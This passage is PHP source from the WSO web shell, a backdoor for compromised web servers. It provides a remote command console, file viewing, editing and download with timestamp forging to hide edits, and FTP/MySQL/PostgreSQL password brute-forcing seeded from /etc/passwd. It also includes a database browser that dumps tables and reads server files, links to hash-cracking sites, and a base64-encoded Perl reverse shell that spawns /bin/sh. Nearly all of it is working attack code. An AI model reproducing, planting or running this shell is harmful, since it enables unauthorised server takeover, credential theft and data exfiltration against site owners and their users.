ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}} if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}} $stringTools = array( 'Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen', ); if(isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true); ob_start(); if(in_array($_POST['p1'], $stringTools)) echo $_POST['p1']($_POST['p2']); $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n"; echo strlen($temp), "\n", $temp; exit; } if(empty($_POST['ajax'])&&!empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0); wsoHeader(); echo '<h1>String conversions</h1><div class=content>'; echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>"; foreach($stringTools as $k => $v) echo "<option value='".htmlspecialchars($v)."'>".$k."</option>"; echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>"; if(!empty($_POST['p1'])) { if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2'])); } echo"</pre></div><br><h1>Search files:</h1><div class=content>
		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
			<tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
			<tr><td></td><td><input type='submit' value='>>'></td></tr>
			</table></form>"; function wsoRecursiveGlob($path) { if(substr($path, -1) != '/') $path.='/'; $paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR))); if(is_array($paths)&&@count($paths)) { foreach($paths as $item) { if(@is_dir($item)){ if($path!=$item) wsoRecursiveGlob($item); } else { if(empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2'])!==false) echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($item)."\", \"view\",\"\")'>".htmlspecialchars($item)."</a><br>"; } } } } if(@$_POST['p3']) wsoRecursiveGlob($_POST['c']); echo "</div><br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name='hf'>
			<input type='text' name='hash' style='width:200px;'><br>
            <input type='hidden' name='act' value='find'/>
			<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>
		</form></div>"; wsoFooter(); } function actionFilesTools() { if( isset($_POST['p1']) ) $_POST['p1'] = urldecode($_POST['p1']); if(@$_POST['p2']=='download') { if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) { ob_start("ob_gzhandler", 4096); header("Content-Disposition: attachment; filename=".basename($_POST['p1'])); if (function_exists("mime_content_type")) { $type = @mime_content_type($_POST['p1']); header("Content-Type: " . $type); } else header("Content-Type: application/octet-stream"); $fp = @fopen($_POST['p1'], "r"); if($fp) { while(!@feof($fp)) echo @fread($fp, 1024); fclose($fp); } }exit; } if( @$_POST['p2'] == 'mkfile' ) { if(!file_exists($_POST['p1'])) { $fp = @fopen($_POST['p1'], 'w'); if($fp) { $_POST['p2'] = "edit"; fclose($fp); } } } wsoHeader(); echo '<h1>File tools</h1><div class=content>'; if( !file_exists(@$_POST['p1']) ) { echo 'File not exists'; wsoFooter(); return; } $uid = @posix_getpwuid(@fileowner($_POST['p1'])); if(!$uid) { $uid['name'] = @fileowner($_POST['p1']); $gid['name'] = @filegroup($_POST['p1']); } else $gid = @posix_getgrgid(@filegroup($_POST['p1'])); echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.wsoPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>'; echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>'; if( empty($_POST['p2']) ) $_POST['p2'] = 'view'; if( is_file($_POST['p1']) ) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); else $m = array('Chmod', 'Rename', 'Touch'); foreach($m as $v) echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> '; echo '<br><br>'; switch($_POST['p2']) { case 'view': echo '<pre class=ml1>'; $fp = @fopen($_POST['p1'], 'r'); if($fp) { while( !@feof($fp) ) echo htmlspecialchars(@fread($fp, 1024)); @fclose($fp); } echo '</pre>'; break; case 'highlight': if( @is_readable($_POST['p1']) ) { echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">'; $code = @highlight_file($_POST['p1'],true); echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>'; } break; case 'chmod': if( !empty($_POST['p3']) ) { $perms = 0; for($i=strlen($_POST['p3'])-1;$i>=0;--$i) $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1)); if(!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>'; } clearstatcache(); echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>'; break; case 'edit': if( !is_writable($_POST['p1'])) { echo 'File isn\'t writeable'; break; } if( !empty($_POST['p3']) ) { $time = @filemtime($_POST['p1']); $_POST['p3'] = substr($_POST['p3'],1); $fp = @fopen($_POST['p1'],"w"); if($fp) { @fwrite($fp,$_POST['p3']); @fclose($fp); echo 'Saved!<br><script>p3_="";</script>'; @touch($_POST['p1'],$time,$time); } } echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>'; $fp = @fopen($_POST['p1'], 'r'); if($fp) { while( !@feof($fp) ) echo htmlspecialchars(@fread($fp, 1024)); @fclose($fp); } echo '</textarea><input type=submit value=">>"></form>'; break; case 'hexdump': $c = @file_get_contents($_POST['p1']); $n = 0; $h = array('00000000<br>','',''); $len = strlen($c); for ($i=0; $i<$len; ++$i) { $h[1] .= sprintf('%02X',ord($c[$i])).' '; switch ( ord($c[$i]) ) { case 0: $h[2] .= ' '; break; case 9: $h[2] .= ' '; break; case 10: $h[2] .= ' '; break; case 13: $h[2] .= ' '; break; default: $h[2] .= $c[$i]; break; } $n++; if ($n == 32) { $n = 0; if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';} $h[1] .= '<br>'; $h[2] .= "\n"; } } echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>'; break; case 'rename': if( !empty($_POST['p3']) ) { if(!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br>'; else die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>'); } echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>'; break; case 'touch': if( !empty($_POST['p3']) ) { $time = strtotime($_POST['p3']); if($time) { if(!touch($_POST['p1'],$time,$time)) echo 'Fail!'; else echo 'Touched!'; } else echo 'Bad time format!'; } clearstatcache(); echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>'; break; } echo '</div>'; wsoFooter(); } function actionConsole() { if(!empty($_POST['p1']) && !empty($_POST['p2'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true); $_POST['p1'] .= ' 2>&1'; } elseif(!empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0); if(isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true); ob_start(); echo "d.cf.cmd.value='';\n"; $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".wsoEx($_POST['p1']),"\n\r\t\\'\0")); if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match)) { if(@chdir($match[1])) { $GLOBALS['cwd'] = @getcwd(); echo "c_='".$GLOBALS['cwd']."';"; } } echo "d.cf.output.value+='".$temp."';"; echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;"; $temp = ob_get_clean(); echo strlen($temp), "\n", $temp; exit; } if(empty($_POST['ajax'])&&!empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0); wsoHeader(); echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>"; echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>'; foreach($GLOBALS['aliases'] as $n => $v) { if($v == '') { echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>'; continue; } echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>'; } echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>'; if(!empty($_POST['p1'])) { echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1'])); } echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>'; echo '</form></div><script>d.cf.cmd.focus();</script>'; wsoFooter(); } function actionLogout() { setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600); die('bye!'); } function actionSelfRemove() { if($_POST['p1'] == 'yes') if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) die('Shell has been removed'); else echo 'unlink error!'; if($_POST['p1'] != 'yes') wsoHeader(); echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>'; wsoFooter(); } function actionBruteforce() { wsoHeader(); if( isset($_POST['proto']) ) { echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>'; if( $_POST['proto'] == 'ftp' ) { function wsoBruteForce($ip,$port,$login,$pass) { $fp = @ftp_connect($ip, $port?$port:21); if(!$fp) return false; $res = @ftp_login($fp, $login, $pass); @ftp_close($fp); return $res; } } elseif( $_POST['proto'] == 'mysql' ) { function wsoBruteForce($ip,$port,$login,$pass) { $res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass); @mysql_close($res); return $res; } } elseif( $_POST['proto'] == 'pgsql' ) { function wsoBruteForce($ip,$port,$login,$pass) { $str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres"; $res = @pg_connect($str); @pg_close($res); return $res; } } $success = 0; $attempts = 0; $server = explode(":", $_POST['server']); if($_POST['type'] == 1) { $temp = @file('/etc/passwd'); if( is_array($temp) ) foreach($temp as $line) { $line = explode(":", $line); ++$attempts; if( wsoBruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) { $success++; echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>'; } if(@$_POST['reverse']) { $tmp = ""; for($i=strlen($line[0])-1; $i>=0; --$i) $tmp .= $line[0][$i]; ++$attempts; if( wsoBruteForce(@$server[0],@$server[1], $line[0], $tmp) ) { $success++; echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp); } } } } elseif($_POST['type'] == 2) { $temp = @file($_POST['dict']); if( is_array($temp) ) foreach($temp as $line) { $line = trim($line); ++$attempts; if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) { $success++; echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>'; } } } echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>"; } echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' .'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' .'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">' .'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">' .'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">' .'<span>Server:port</span></td>' .'<td><input type=text name=server value="127.0.0.1"></td></tr>' .'<tr><td><span>Brute type</span></td>' .'<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' .'<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' .'<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' .'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' .'<td><input type=text name=login value="root"></td></tr>' .'<tr><td><span>Dictionary</span></td>' .'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>' .'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>'; echo '</div><br>'; wsoFooter(); } function actionSql() { class DbClass { var $type; var $link; var $res; function DbClass($type) { $this->type = $type; } function connect($host, $user, $pass, $dbname){ switch($this->type) { case 'mysql': if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true; break; case 'pgsql': $host = explode(':', $host); if(!$host[1]) $host[1]=5432; if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true; break; } return false; } function selectdb($db) { switch($this->type) { case 'mysql': if (@mysql_select_db($db))return true; break; } return false; } function query($str) { switch($this->type) { case 'mysql': return $this->res = @mysql_query($str); break; case 'pgsql': return $this->res = @pg_query($this->link,$str); break; } return false; } function fetch() { $res = func_num_args()?func_get_arg(0):$this->res; switch($this->type) { case 'mysql': return @mysql_fetch_assoc($res); break; case 'pgsql': return @pg_fetch_assoc($res); break; } return false; } function listDbs() { switch($this->type) { case 'mysql': return $this->query("SHOW databases"); break; case 'pgsql': return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'"); break; } return false; } function listTables() { switch($this->type) { case 'mysql': return $this->res = $this->query('SHOW TABLES'); break; case 'pgsql': return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'"); break; } return false; } function error() { switch($this->type) { case 'mysql': return @mysql_error(); break; case 'pgsql': return @pg_last_error(); break; } return false; } function setCharset($str) { switch($this->type) { case 'mysql': if(function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link); else $this->query('SET CHARSET '.$str); break; case 'pgsql': return @pg_set_client_encoding($this->link, $str); break; } return false; } function loadFile($str) { switch($this->type) { case 'mysql': return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file")); break; case 'pgsql': $this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;"); $r=array(); while($i=$this->fetch()) $r[] = $i['file']; $this->query('drop table wso2'); return array('file'=>implode("\n",$r)); break; } return false; } function dump($table, $fp = false) { switch($this->type) { case 'mysql': $res = $this->query('SHOW CREATE TABLE `'.$table.'`'); $create = mysql_fetch_array($res); $sql = $create[1].";\n"; if($fp) fwrite($fp, $sql); else echo($sql); $this->query('SELECT * FROM `'.$table.'`'); $i = 0; $head = true; while($item = $this->fetch()) { $sql = ''; if($i % 1000 == 0) { $head = true; $sql = ";\n\n"; } $columns = array(); foreach($item as $k=>$v) { if($v === null) $item[$k] = "NULL"; elseif(is_int($v)) $item[$k] = $v; else $item[$k] = "'".@mysql_real_escape_string($v)."'"; $columns[] = "`".$k."`"; } if($head) { $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')'; $head = false; } else $sql .= "\n\t,(".implode(", ", $item).')'; if($fp) fwrite($fp, $sql); else echo($sql); $i++; } if(!$head) if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n"); break; case 'pgsql': $this->query('SELECT * FROM '.$table); while($item = $this->fetch()) { $columns = array(); foreach($item as $k=>$v) { $item[$k] = "'".addslashes($v)."'"; $columns[] = $k; } $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n"; if($fp) fwrite($fp, $sql); else echo($sql); } break; } return false; } }; $db = new DbClass($_POST['type']); if(@$_POST['p2']=='download') { $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); $db->selectdb($_POST['sql_base']); switch($_POST['charset']) { case "Windows-1251": $db->setCharset('cp1251'); break; case "UTF-8": $db->setCharset('utf8'); break; case "KOI8-R": $db->setCharset('koi8r'); break; case "KOI8-U": $db->setCharset('koi8u'); break; case "cp866": $db->setCharset('cp866'); break; } if(empty($_POST['file'])) { ob_start("ob_gzhandler", 4096); header("Content-Disposition: attachment; filename=dump.sql"); header("Content-Type: text/plain"); foreach($_POST['tbl'] as $v) $db->dump($v); exit; } elseif($fp = @fopen($_POST['file'], 'w')) { foreach($_POST['tbl'] as $v) $db->dump($v, $fp); fclose($fp); unset($_POST['p2']); } else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>'); } wsoHeader(); echo "
<h1>Sql browser</h1><div class=content>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' "; if(@$_POST['type']=='mysql')echo 'selected'; echo ">MySql</option><option value='pgsql' "; if(@$_POST['type']=='pgsql')echo 'selected'; echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
<td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>"; $tmp = "<input type=text name=sql_base value=''>"; if(isset($_POST['sql_host'])){ if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { switch($_POST['charset']) { case "Windows-1251": $db->setCharset('cp1251'); break; case "UTF-8": $db->setCharset('utf8'); break; case "KOI8-R": $db->setCharset('koi8r'); break; case "KOI8-U": $db->setCharset('koi8u'); break; case "cp866": $db->setCharset('cp866'); break; } $db->listDbs(); echo "<select name=sql_base><option value=''></option>"; while($item = $db->fetch()) { list($key, $value) = each($item); echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>'; } echo '</select>'; } else echo $tmp; }else echo $tmp; echo "</td>
				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>"; if(isset($db) && $db->link){ echo "<br/><table width=100% cellpadding=2 cellspacing=0>"; if(!empty($_POST['sql_base'])){ $db->selectdb($_POST['sql_base']); echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>"; $tbls_res = $db->listTables(); while($item = $db->fetch($tbls_res)) { list($key, $value) = each($item); if(!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.'')); $value = htmlspecialchars($value); echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>"; } echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>"; if(@$_POST['p1'] == 'select') { $_POST['p1'] = 'query'; $_POST['p3'] = $_POST['p3']?$_POST['p3']:1; $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']); $num = $db->fetch(); $pages = ceil($num['n'] / 30); echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">"; echo " of $pages"; if($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>"; if($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>"; $_POST['p3']--; if($_POST['type']=='pgsql') $_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30); else $_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30'; echo "<br><br>"; } if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) { $db->query(@$_POST['p2']); if($db->res !== false) { $title = false; echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">'; $line = 1; while($item = $db->fetch()) { if(!$title) { echo '<tr>'; foreach($item as $key => $value) echo '<th>'.$key.'</th>'; reset($item); $title=true; echo '</tr><tr>'; $line = 2; } echo '<tr class="l'.$line.'">'; $line = $line==1?2:1; foreach($item as $key => $value) { if($value == null) echo '<td><i>null</i></td>'; else echo '<td>'.nl2br(htmlspecialchars($value)).'</td>'; } echo '</tr>'; } echo '</table>'; } else { echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>'; } } echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>"; if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']); echo "</textarea><br/><input type=submit value='Execute'>"; echo "</td></tr>"; } echo "</table></form><br/>"; if($_POST['type']=='mysql') { $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'"); if($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>"; } if(@$_POST['p1'] == 'loadfile') { $file = $db->loadFile($_POST['p2']); echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>'; } } else { echo htmlspecialchars($db->error()); } echo '</div>'; wsoFooter(); } function actionNetwork() { wsoHeader(); $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"; 